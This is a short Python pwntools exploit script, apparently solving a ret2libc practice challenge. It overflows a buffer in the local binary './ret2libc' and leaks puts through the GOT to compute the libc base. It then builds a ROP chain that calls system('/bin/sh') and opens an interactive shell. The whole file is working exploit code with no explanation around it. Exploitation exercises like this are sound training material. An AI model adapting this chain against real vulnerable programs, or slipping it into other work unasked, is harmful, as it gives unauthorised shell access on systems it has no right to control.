#!/usr/bin/env python3
from pwn import *
import time
context.arch = "amd64"
epath = "./ret2libc"
l = ELF("/usr/lib/libc.so.6")
e = ELF(epath)
r = process(epath)

ret = 0x4006cd
rdi = 0x400733
pad = b"\x00"*0x38

r.recvline()
r.sendline(flat(pad,
                rdi,
                e.got.puts,
                e.sym.puts,
                e.sym.main))
l.address = u64(r.recvline().strip().ljust(8, b"\x00")) - l.sym.puts
success("libc base %s" % hex(l.address))
r.recvline()
r.sendline(flat(pad,
                rdi,
                next(l.search(b"/bin/sh\x00")),
                ret,
                l.sym.system))

r.interactive()
r.close()
